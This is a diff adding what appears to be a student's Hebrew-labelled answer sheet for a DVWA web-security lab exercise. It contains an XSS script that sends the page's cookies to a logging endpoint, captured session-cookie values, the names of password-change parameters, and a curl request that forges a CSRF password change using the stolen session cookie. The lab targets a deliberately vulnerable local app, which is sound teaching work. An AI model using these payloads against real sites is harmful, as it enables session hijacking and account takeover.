@@ -1,0 +1,22 @@
+שאלה א:
+
+<script>document.location="http://localhost/cgi-bin/logit.pl?"+document.cookie</script>
+
+שאלה ב:
+
+security      VALUE: low
+ PHPSESSID   VALUE: 290kun4l966hc5mp3f7fd2hujn
+
+שאלה ג:
+
+GET
+
+שאלה ד:
+
+password_new
+password_conf
+
+שאלה ה:
+
+curl -b "security=low;PHPSESSID=290kun4l966hc5mp3f7fd2hujn"--location "http://localhost/DVWA/vulnerabilities/csrf/?password_current=12&password_new=1234&password_conf=1234&Change=Change&user_token=ff1a4ed7dbec7e95e3c6b789e627f8ba"
+
